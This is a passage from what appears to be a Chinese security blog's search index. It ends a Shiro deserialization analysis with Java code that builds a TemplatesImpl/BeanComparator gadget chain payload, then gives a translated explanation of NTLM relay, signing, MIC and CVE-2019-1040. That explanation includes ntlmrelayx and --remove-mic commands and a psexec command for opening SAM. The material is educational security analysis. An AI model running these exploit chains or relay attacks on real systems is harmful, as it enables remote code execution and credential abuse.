clazzBytes) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); // stub data for replacement later queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); return barr.toByteArray(); } } ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:6:2","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"参考 phith0n Java 漫谈系列 Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:7:0","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["内网渗透"],"content":"本文翻译自 hackndo 的 NTLM Relay，之前在学习 NTLM Relay 时参考过，现在拿出来 remark 一下","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"NTLM Relay ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:0:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"1 NTLM 协议 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:1:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"1.1 简介 NTLM 协议是一个在微软环境中使用的认证协议。该协议允许用户向服务器证明其身份，以便使用该服务器提供的服务。 有两种认证的场景： 工作组环境 用户使用服务器本地帐户的密钥。由于服务器在其本地数据库中拥有用户的密钥，能够对用户进行身份验证； 域环境 在 Active Directory 环境中，用户在身份验证期间使用域帐户，在这种情况下，服务器将向域控发送用户的认证信息。 在这两种情况下，NTLM 认证始于客户和服务器之间的「挑战/响应」机制。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:1:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"1.2 挑战 - 响应认证机制 挑战/响应机制的目的是为了让服务器验证用户的身份，且不通过网络传输用户密码。整个认证过程有三步。 协商 - Negotiation - type1 客户端向服务端发送认证请求(NEGOTIATE_MESSAGE) 挑战 - Challenge - type2 服务端向客户端发送 64 位的随机值(CHALLENGE_MESSAGE) 响应 - Response - type3 客户端使用其用户的 NT Hash 值对 Challenge 进行加密，并将结果返回给服务端 下图为 1 次 NTLM 认证过程： 为了完成身份验证，服务器只需要检查客户端发送的响应的有效性。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:1:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"1.3 认证 NT Hash 的计算： 先将用户密码转换为十六进制格式。 将十六进制格式的密码进行 Unicode 编码。 使用 MD4 摘要算法对 Unicode 编码数据进行 Hash 计算 python2 -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new(\"md4\", \"p@Assword!123\".encode(\"utf-16le\")).digest())' 如前文所述，NTLM 认证有两种不同的场景。 1.3.1 本地账户 在使用本地帐户完成身份验证的场景下，服务器使用用户的密钥或用户密钥的 MD4 散列(NT Hash)对其发送给客户端的 Challenge 进行加密。 然后它会检查它的操作结果是否等于客户端的响应，证明用户身份。 服务器需要存储本地用户及其密码的哈希值。 此数据库的名称是 SAM（安全帐户管理器）。 SAM 可以在注册表中找到，可以使用 psexec 以 SYSTEM 身份打开它： psexec.exe -i -s regedit.exe 在 C:\\Windows\\System32\\SAM 下也有一份拷贝。 总结下工作组下的认证流程： 服务器发送一个 Challenge (1) 并且客户端使用其密钥的哈希值加密该质询，然后使用其用户对应的 NT Hash 加密 Challenge 并将其发送回服务器 (2)。服务器将在其 SAM 中查找用户密码的哈希值 (3)， 并加密之前用这个散列发送的 Challenge (4)，并将其结果与用户返回的结果进行比较。 如果相同 (5) 则用户已通过身份验证，否则，认证失败。 1.3.2 域账户 当用域帐户进行认证时，用户的 NT Hash 不再存储在服务器上，而是存储在域控制器上。用户要认证的服务器会收到客户端对 Challenge 加密的响应报文，但它不能检查该响应是否有效，因此，服务端需要把验证身份的任务委托给域控制器。 为此，在服务端与域控进行通信时，使用了 Netlogon 服务，该服务能够与域控制器建立安全会话，被称为安全通道(Secure Channel)。由于服务器知道自己的密钥，而域控制器知道服务器密钥的哈希，服务端与域控之间可以交换会话密钥并安全地通信。 客户端向域控发送 NETLOGON_NETWORK_INFO，其中主要包括： typedef struct _NETLOGON_NETWORK_INFO { NETLOGON_LOGON_IDENTITY_INFO Identity; LM_CHALLENGE LmChallenge; STRING NtChallengeResponse; STRING LmChallengeResponse; } NETLOGON_NETWORK_INFO, *PNETLOGON_NETWORK_INFO; 客户端用户名 (Identity) 服务端向客户端发送的 Challenge (LmChallenge) 客户端向服务端发送的 Response (NtChallengeResponse) 域控将在其数据库中查找对应用户的 NT Hash。对于域控制器，用户的数据被存储在 NTDS.DIT 的文件中。一旦检索到 NT Hash，计算 Challenge 的加密值，并将此结果与客户端的响应进行比较。 总结下域环境下的认证流程： 和之前的情况类似，服务器发送一个挑战 (1)，客户端 jsnow 用 NT Hash 加密，并将它连同它的用户名和域名 (2) 一起发送回服务器。服务器将使用 Netlogon 服务 (3) 将此信息发送到安全通道中的域控制器。域控制器在其 NTDS.DIT 数据库 (4) 中找到用户散列来加密 Challenge，然后将两个结果进行比较。如果是相同的 (5)，则用户已通过身份验证。 否则认证失败。在这两种情况下，域控制器都会将信息传输到服务器 (6)。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:1:3","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"2 NTLM Relay ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"2.1 几种 Hash 为了避免混淆，总结下相关 Hash 的名词： NT Hash 和 LM Hash 是用户密码的散列版本。 LM Hash 已经完全过时，本文不再讨论。NT Hash 通常又被称为 NTLM Hash。此名称与协议名称 NTLM 存在混淆。因此，当谈论用户的密码哈希时，将其称为 NT Hash。 NTLM 是身份验证协议的名称。目前有两个版本的 NTLM 协议。 NTLMv1 响应和 NTLMv2 响应将是用于指代客户端发送的 Challenge 响应的术语，适用于 NTLM 协议的版本 1 和 2。 Net-NTLMv1 和 Net-NTLMv2 是当 NT Hash 称为 NTLM 哈希时使用的伪新术语，用于将 NTLM Hash与协议区分开来。由于我们不使用 NTLM Hash 术语，因此不会使用这两个术语。 Net-NTLMv1 Hash 和 Net-NTLMv2 Hash 也是避免混淆的术语，但也不会在本文中使用。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"2.2 简介 顾名思义，NTLM Relay 攻击依赖于 NTLM 身份验证。攻击存在下面的场景中：攻击者设法在客户端和服务器之间处于中间人的位置，并简单地将信息从一端转发到另一端。 中间人的位置意味着：从客户端的角度来看，攻击者的机器是他想要认证的服务器，而从服务器的角度来看，攻击者是一个像其他想要认证访问资源的客户端。 当然，攻击者并不只是想对目标服务器进行认证，而是伪造成受害的用户身份来控制服务端。但是，由于攻击者不知道用户的密钥，即使他监听了对话，由于这个密钥从未在网络上传输，攻击者也无法提取任何信息。那么，它是如何工作的呢？ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"2.3 消息中继 在 NTLM 认证过程中，客户用其 NT Hash 加密服务器提供的 Challenge 来向服务器证明其身份。因此，攻击者唯一要做的就是让客户端做好加密，并把信息从客户端传给服务器，以及把服务器的回复传给客户端。 客户端向服务器发送的所有信息，攻击者都会收到，并把信息重放给真正的服务器。而服务器向客户发送的所有信息，攻击者也会收到，并将其原封不动的转发给客户端。 实际上，从客户的角度来看，在图的左侧，攻击者和它之间进行了 NTLM 身份验证。 客户端在其第一条消息中发送协商请求，攻击者以 Challenge 回复该请求。 收到此 Challenge 后，客户端使用其密钥构建 Response，并最终发送包含加密质询的最后一条身份验证消息。 但是，攻击者不能用这个交换做任何事情。因此，需要思路转向上图的右半边。实际上，从服务器的角度来看，攻击者是一个和其它用户一样的客户端。它发送了第一条消息要求认证，而服务器用挑战来回应。由于攻击者向真正的客户发送了这个同样的 Challenge，真正的客户端用它的密钥对这个挑战进行了加密，并以一个有效的响应进行回复。因此，攻击者可以向服务器发送这个有效的响应。 这就是攻击的点所在。从服务器的角度来看，它不知道攻击者正在向客户重放其信息。 因此，从服务器的角度来看，这就是所发生的事情： 在这些交换结束时，攻击者在服务器上使用客户端的凭据进行身份验证。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:3","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"2.4 Net-NTLMv1 and Net-NTLMv2 攻击者在 type 3 中转发的这个有效响应，通常称为 Net-NTLMv1 Hash 或 Net-NTLMv2 Hash。 但在本文中，它将被称为 NTLMv1 响应或 NTLMv2 响应，如前文所述。 确切地说，这并不是 Challenge 的加密版本，而是使用客户端密钥计算出的哈希值。 以 NTLMv2 为例，NTLMv2 Hash = HMAC-MD5(unicode(hex(upper(username+domain))), NT Hash)，这种类型的哈希只能用暴力破解。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:2:4","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"3 实战 IP 地址为 192.168.56.221 的 DESKTOP01 客户端和 IP 地址为 192.168.56.211 的 WEB01 服务器。 IP 地址为 192.168.56.1 为中间人。攻击场景如下： 使用 impacket 包中的 ntlmrelayx 进行攻击。 python ntlmrelayx.py -t 192.168.56.221 网络流量如下： 绿色的是 DESKTOP01 客户端和攻击者之间的流量，红色是攻击者和 WEB01 服务器之间的流量。 可以清楚地看到 DESKTOP01 和攻击者之间以及攻击者和 WEB01 服务器之间的 3 条 NTLM 消息。 为了理解中继的概念，通过验证当 WEB01 向攻击者发送质询时，攻击者向 DESKTOP01 发送回完全相同的内容。 这是 WEB01 向攻击者发送的 Challenge： 当攻击者收到这个挑战时，它不加任何修改地将其发送到 DESKTOP01。 在上面的过程中，Challenge 值是 b6515172c37197b0。 然后客户端将使用它的密钥来计算响应，将计算好的响应值连同用户名 (jsnow)、主机名 (DESKTOP01) 一起发送，在这个例子中是一个域用户，因此主机名是本域的域名 (ADSEC)。 得到 Response 的攻击者将完全相同的信息发送到服务器。于是中间人冒充了 DESKTOP01 上的 jsnow，是 ADSEC 域的域用户，它还发送了客户端计算出来的响应，在这些截图中称为 NTLM 响应。将此响应称为 NTLMv2 Hash。 从流量上可以看到，攻击者只是在转发数据。 它只是将客户端的信息转发给服务器，反之亦然，只不过最后服务器认为攻击者认证成功，然后攻击者就可以代表 ADSEC\\jsnow 在服务器上执行操作。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:3:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"4 认证与会话 上文阐述了 NTLM 中继的基本原理，接下来出现的问题是，在中继 NTLM 身份验证后，如何在目标服务器上执行具体地操作？ 要回答这个问题，必须首先澄清一个基本的事实。当客户端向服务器进行身份验证以执行某些操作时，必须区分两件事： 身份验证(Authentication)，允许服务器验证客户端是它声称的身份。 会话(Session)，在此期间客户端将能够执行操作。 如果客户端通过了正确的身份验证，那么它将能够访问服务器提供的资源，例如网络共享、对 LDAP 目录的访问、HTTP 服务器或 SQL 数据库等等。 为了管理这两个步骤，所使用的协议必须能够封装身份验证，从而交换 NTLM 消息。 如果所有协议都集成 NTLM 技术细节，是不符合软件工程中的解耦思想的。因此，微软提供了一个接口来处理身份验证，并且专门开发了包来处理不同类型的身份验证。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:4:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"4.1 SSPI \u0026 NTLNSSP SSPI 接口(Security Support Provider Interface)是 Microsoft 提出的用于标准化身份验证的接口，不同的协议都可以使用这个接口来处理不同类型的身份验证过程。在 NTLM 认证中，使用的是 NTLMSSP（NTLM 安全支持提供程序）。 SSPI 接口提供了几个函数，包括 AcquireCredentialsHandle、InitializeSecurityContext 和 AcceptSecurityContext。在 NTLM 身份验证期间，客户端和服务器都会使用到这些函数。简述这些步骤： 客户端调用 AcquireCredentialsHandle 获得对用户凭据的间接访问。 客户端然后调用 InitializeSecurityContext，该函数在第一次调用时将创建类型为 NEGOTIATE 的 type 1 消息。对于研发来说，这条消息是什么并不重要，重要的是将它发送到服务器。 服务器在收到消息时调用 AcceptSecurityContext 函数。 这个函数然后将创建类型为 Challange 的 type 2 数据。 收到此消息时，客户端将再次调用 InitializeSecurityContext，但这次将 CHALLENGE 作为参数传递。 NTLMSSP 负责通过加密 Challenge 来计算响应的内容，并生成最后的 AUTHENTICATE 消息。 服务器收到该消息后，也会再次调用 AcceptSecurityContext，自动进行鉴权验证。 这意味着这 5 个步骤完全独立于客户端的类型或服务器的类型。 无论使用何种协议，只要该协议具有允许这种不透明结构，以一种或另一种方式从客户端交换到服务器的内容，它们就可以工作。 因此，协议通过将 NTLMSSP、Kerberos 或其他身份验证结构放入特定字段，如果客户端或服务器看到该字段中有数据，它只会将其传递给 InitializeSecurityContext 或 AcceptSecurityContext。 应用层（HTTP、SMB、SQL 等）完全独立于身份验证层（NTLM、Kerberos 等）。 因此，认证层和应用层都需要安全措施。 通过 SMB 和 HTTP 的两个示例帮助读者更好地理解。其它协议也十分相似。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:4:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"4.2 HTTP \u0026 NTLM 一个 HTTP 的基本请求： GET /index.html HTTP/1.1 Host: www.geekby.site User-Agent: Mozilla/5.0 Accept: text/html Accept-Language: zh-cn 此示例中的必需元素是 HTTP 动词 (GET)、请求页面的路径 (/index.html)、协议版本 (HTTP/1.1) 或主机标头 (Host: beta.hackndo.com)。 但是可以还添加其它的 HTTP 头。最好的情况是，服务器知道这些标头会存在，并且知道如何处理。最坏的情况是直接忽略。 正是 HTTP 的此项特性，能够将 NTLM 的相关信息从客户端传输到服务器。即在客户端添加 Authorization 的 HTTP 头，在服务端添加一个 WWW-Authenticate 的头。如果客户端尝试访问需要身份验证的网站，服务器将通过添加 WWW-Authenticate 标头来响应，内容包含其支持的不同身份验证机制。如对于 NTLM，返回：WWW-Authenticate: NTLM。 客户端知道需要 NTLM 身份验证，将发送 Authorization 头中的第一条消息，并 base64 编码(因为该消息仅包含不可打印的字符)。 服务器将在 WWW-Authenticate 填充 Challenge，客户端将计算响应并将其放到 Authorization 头中。如果认证成功，服务器通常会返回 200 返回码。 \u003e GET /index.html HTTP/1.1 \u003e Host: www.geekby.site \u003e User-Agent: Mozilla/5.0 \u003e Accept: text/html \u003e Accept-Language: en \u003c HTTP/1.1 401 Unauthorized \u003c WWW-Authenticate: NTLM \u003c Content type: text/html \u003c Content-Length: 0 \u003e GET /index.html HTTP/1.1 \u003e Host: www.geekby.site \u003e User-Agent: Mozilla/5.0 \u003e Accept: text/html \u003e Accept-Language: zh-ch =\u003e Authorization: NTLM \u003cNEGOTIATE in base64\u003e \u003c HTTP/1.1 401 Unauthorized =\u003e WWW-Authenticate: NTLM \u003cCHALLENGE in base64\u003e \u003c Content type: text/html \u003c Content-Length: 0 \u003e GET /index.html HTTP/1.1 \u003e Host: www.geekby.site \u003e User-Agent: Mozilla/5.0 \u003e Accept: text/html \u003e Accept-Language: zh-cn =\u003e Authorization: NTLM \u003cRESPONSE in base64\u003e \u003c HTTP/1,200 OKAY. \u003c WWW-Authenticate: NTLM \u003c Content type: text/html \u003c Content-Length: 0 \u003c Connection: close 只要 TCP 会话处于打开状态，身份验证就会有效。然而，一旦会话关闭，服务器将不再拥有客户端的安全上下文，并且必须进行新的身份验证。由于 Microsoft 的 SSO（单点登录）机制，整个过程对用户是透明的。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:4:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"4.3 SMB \u0026 NTLM 再举一个SMB 协议的例子。SMB 协议，通常用于访问网络共享。 SMB 协议通过使用命令来工作(Microsoft 定义的相关文档)，例如，有 SMB_COM_OPEN、SMB_COM_CLOSE 或 SMB_COM_READ，用于打开、关闭或读取文件的命令。 SMB 还有一个专门用于配置 SMB 会话的命令，SMB_COM_SESSION_SETUP_ANDX。 此命令中有两个字段专用于 NTLM 认证的字段。 LM/LMv2 认证：OEMPassword NTLM/NTLMv2 认证：UnicodePassword 下图是一个 SMB 数据包的样例，其中包含服务器对身份验证的响应。 这两个示例表明 NTLM 的内容与协议无关。它可以包含在任何支持它的协议中。 然后，将身份验证部分与应用程序会话部分做区分。会话部分是通过客户端身份验证后使用的协议进行的交换的延续，例如通过 HTTP 浏览网站，使用 SMB 访问网络共享上的文件。 由于认证和会话过程彼此的信息是独立的，这意味着中间人很可能会通过 HTTP 接收身份验证，并将其中继到服务器但使用 SMB，称为跨协议中继。 考虑到所有这些因素，下一章节将重点介绍已经各种存在风险的点，以及用于解决这些问题所引入的安全机制。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:4:3","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"5 会话签名 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:5:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"5.1 原理 签名是一种验证真实性的方法，它确保数据在发送和接收之间没有被篡改。例如，如果用户 jdoe 发送文本 Hello World，并对该文档进行数字签名，那么任何收到此文档并签名的人都可以验证是 jdoe 编辑它，并且可以确定这句话是他写的，因为签名保证文档没有被修改。 签名原理可以应用于信息交换。例如，SMB、LDAP 甚至 HTTP 协议。但是，在实践中，很少实现 HTTP 消息的签名。 但是，对包签名有什么意义呢？如前所述，会话和身份验证是两个独立的步骤，由于攻击者可以处于中间人位置并中继身份验证消息，因此它可以冒充客户端。 这就是签名发挥作用的地方。即使攻击者已设法以客户端身份向服务器进行身份验证，但无论身份验证的结果如何，由于没有用户的密钥，都无法对数据包进行签名。因此接收数据包的服务器将看到签名失效在或不存在，会拒绝攻击者的请求。 所以签名值防止 NTLM 中继攻击非常有效的措施。但是客户端和服务器如何就是否签署数据包达成一致呢？ 有两件事在这里起作用： 一是标识是否支持签名。这是在 NTLM 协商期间完成的。 二是允许指示签名是必需的、可选的还是禁用的。这是在客户端和服务器级别完成的设置。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:5:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"5.2 NTLM 协商过程 NTLM Negotiation 阶段使得客户端或服务器了解是否支持签名，并在 NTLM 交换期间完成。事实上，在 NTLM 消息中，除了要交换的质询和响应之外，还有 Negotiate Flags。 当 Negotiate Sign flag 为 1 时，表明客户端支持签名。但是并不意味着签名是必要的，只是说明客户端有签名的能力。同理，服务端也是类似的。 因此，协商过程允许客户端和服务器两方中的每一方向另一方表明它是否能够对数据包进行签名。对于某些协议，即使客户端和服务器都支持签名，这并不一定意味着数据包会被签名。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:5:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"5.3 实现 根据协议的不同，通常可以设置 2 个甚至 3 个选项来决定是否强制执行签名。 3 个选项是： Disabled：禁用签名 Enabled：可以在需要时处理签名，但不强制签名。 Mandatory：表明不仅支持签名，而且必须对数据包进行签名才能继续会话。 下文将以 SMB 和 LDAP 两个协议为例。 5.3.1 SMB 5.3.1.1 签名矩阵 微软的相关文档中提供了一个矩阵，以确定是否基于客户端和服务器端设置对 SMB 数据包进行签名。但是，对于 SMBv2 及更高版本，必须处理签名，Disabled 参数不再存在。 当客户端和服务器具有 Enabled 设置时会有所不同。 在 SMBv1 中，服务器的默认设置为 Disabled。防止服务器在每次发送 SMB 数据包时计算签名来避免服务器过载，因此，客户端和服务器之间的所有 SMB 流量都未签名。由于 SMBv2 不再存在禁用状态，并且服务器现在默认启用，为了保持这种负载节省，在这种情况下也是不需要签名。只有客户端或服务器启用 Require 参数才对 SMB 数据包进行签名。 5.3.1.2 设置 为了更改服务器上的默认签名设置，必须在注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters 中更改 EnableSecuritySignature 和 RequireSecuritySignature 项。 在域控制器上， 默认情况下，当客户端对其进行身份验证时，域控制器需要 SMB 签名。 下图为应用于域控制器的组策略配置： 另外，在上图中可以看到，Microsoft network client 选项未设置 Enable 参数。因此，当域控制器充当 SMB 服务器时，需要 SMB 签名，但如果连接来自域控制器到其它服务器，则不需要 SMB 签名。 5.3.1.3 流程 在了解 SMB 签名的配置位置之后，可以看到在 NTLM 协议通信期间应用的这个选项，它是在身份验证之前完成的。当客户端连接到 SMB 服务器时，步骤如下： 协商 SMB 版本和签名要求 验证 具有协商参数的 SMB 会话 上图中可以看到，来自服务器的响应表明它具有 Enable 参数，但不需要签名。 总而言之，协商 / 身份验证 / 会话的流程如下： 在协商阶段，双方提出要求：其中之一是否需要签名？ 在认证阶段，双方表明他们支持什么。它们有能力签名么？ 在会话阶段，如果能力和要求兼容，则按照协商的内容进行会话。 例如，如果 DESKTOP01 客户端要与 DC01 域控制器通信，则 DESKTOP01 表示它不需要签名，但是可以处理带签名的数据包。 DC01 表示不仅支持签名，而且需要签名： 在协商阶段，客户端和服务器将 NEGOTIATE_SIGN 标志设置为 1，表示它们都支持签名。 身份验证完成后，会话将继续，SMB 数据包将被签名。 5.3.2 LDAP 5.3.2.1 签名矩阵 对于 LDAP 协议来说，有三个等级： Disabled：不支持数据包签名。 Negotiated：表示可以处理签名，如果与之通信的机器也可以处理签名的话，那么后续的数据将被签名。 Required：表示不仅支持签名，而且必须对数据包进行签名才能继续会话。 在中间层，Negotiated Signing 与 SMBv2 的情况不同。如果客户端和服务器能够对数据包进行签名，那么它们就会签名。 而对于 SMBv2，只有在至少一个实体开启 Require 时才对数据包进行签名。 所以对于 LDAP，有一个类似于 SMBv1 的矩阵： 另外，与 SMB 不同的是，在 Active Directory 域中，所有主机都能自行配置 Negotiated Signing。域控制器不强制签名。 5.3.2.2 设置 对于域控制器，ldapserverintegrity 注册表项位于 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\NTDS\\Parameters hive 中，并且可以是 0、1 或 2，具体取决于级别。默认情况下，它在域控制器上设置为 1。 对于客户端，此注册表项位于 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\ldap 对于客户端，它也设置为 1。由于所有客户端和域控制器都默认配置了 Negotiated，因此默认情况下所有 LDAP 数据包都进行签名。 5.3.2.3 流程 与 SMB 不同，LDAP 中没有指示是否对数据包进行签名的标志。但是，LDAP 使用与 NTLM 协商中相同的 flag 标志位。在客户端和服务器都支持 LDAP 签名的情况下，将设置 NEGOTIATE_SIGN 标志并对数据包进行签名。 如果一方要求签名，而另一方不支持，则会话根本不会开始。需要签名的一方将忽略未签名的数据包。 所以与 SMB 相反，如果攻击者在客户端和服务器之间，并且想使用 LDAP 将身份验证中继到服务器，需要满足两个条件： 服务器必须不需要数据包签名，默认情况下所有机器都是这种情况 客户端不得将 NEGOTIATE_SIGN 标志设置为 1。如果他这样做了，那么服务器将需要签名，并且由于我们不知道用户的密钥，就无法对伪造的 LDAP 数据包进行签名。 关于要求 2，有时客户端不设置此标志，但是，Windows SMB 客户端设置了该参数，默认情况下，无法将 SMB 身份验证中继到 LDAP。 那么为什么不直接更改 NEGOTIATE_FLAG 标志并将其设置为 0？这就是我们将在下一节中要阐述的内容。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:5:3","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"6 认证签名(MIC) 上文中以 SMB、LDAP 两个协议为例，阐述了如何保护会话免受中间人攻击。为了进一步阐述 MIC 的作用，再举一个具体的案例。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:6:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"6.1 经典案例 假设攻击者设法将自己置于中间人位置，并且通过 SMB 接收身份验证请求。知道域控制器需要 SMB 签名，攻击者不可能通过 SMB 中继进行攻击。另一方面，正如前文所述，由于身份验证和会话相互独立，因此中继攻击时可以更改协议的，并且攻击者决定中继到 LDAPS 协议。 在身份验证数据中存在 NEGOTIATE_SIGN 标志，该标志仅用于指示客户端和服务器是否支持签名。但在某些情况下，这个标志会被考虑在内，如上文中描述的 LDAP 协议那样。 对于 LDAPS，服务器也会同样使用此标志位。LDAPS 是基于 TLS 的 LDAP，TLS 负责处理数据包签名（和加密）的。因此，如果服务器收到 NEGOTIATE_SIGN 标志设置为 1 的身份验证请求，LDAPS 客户端没有理由表明它可以签名数据包，因此，服务端将拒绝身份验证。 在上面设想的攻击流程中，客户端想要通过 SMB 进行身份验证，它支持数据包签名，并将 NEGOTIATE_SIGN 标志设置为 1。但是如果我们中继其身份验证，而无需更改任何内容，通过 LDAPS，然后 LDAPS 服务器将看到此标志，并会终止身份验证。 可以简单地修改 NTLM 消息并删除标志么？如果可以，上面的攻击场景就成立。但是，除了在 NTLM 级别的签名外，还有另一个签名。该签名称为 MIC，或消息完整性代码。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:6:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"6.2 MIC - Message Integrity Code MIC 是仅在 NTLM 身份验证的最后一条消息 AUTHENTICATE 消息中发送的签名。该签名在计算时会包含 NTLM 认证的 3 条消息。 MIC 使用 HMAC_MD5 函数计算，密钥为基于用户密钥生成的密钥，称为会话密钥(Session Key)。 HMAC_MD5(Session key, NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE) 重要的是会话密钥取决于用户的密钥，因此攻击者无法重新计算 MIC。 下图为 MIC 的样例： 因此，如果 3 个消息中只要有一个被修改，则 MIC 将不再有效。所以不能像直接更改 NEGOTIATE_SIGN 标志。 由于MIC 是可选的，如果只是移除 MIC 呢？但是，这样做并不会有效果。因为还有另一个标志位表明 MIC 将出现，即 msAvFlags。 它也存在于 NTLM 响应中，如果它是 0x00000002，则向服务器表名必须存在 MIC。因此，如果服务器没有看到 MIC，它就会终止身份验证。 如果将 msAcFlags 设置为 0，然后再移除 MIC 呢？ 事实证明，NTLMv2 Hash，即客户端对 Challenge 的响应，它不仅考虑了 Challenge，而且还考虑了响应的所有标志。表示 MIC 存在的标志是此响应的一部分。 更改或删除此标志将使 NTLMv2 Hash 失效，因为数据将被修改。 MIC 保护 3 条消息的完整性，msAvFlags 保护 MIC 的存在，NTLMv2 哈希保护标志的存在。攻击者不知道用户的密钥，也无法重新计算这个哈希。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:6:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"6.3 Drop the MIC CVE-2019-1040：Drop the MIC 漏洞。该漏洞指出：如果直接移除 MIC，即使该标志表明其存在，服务器也会接受身份验证。 可以使用 ntlmrelayx 工具中的 --remove-mic 参数来删除 MIC。 ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:6:3","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["内网渗透"],"content":"7 Session Key 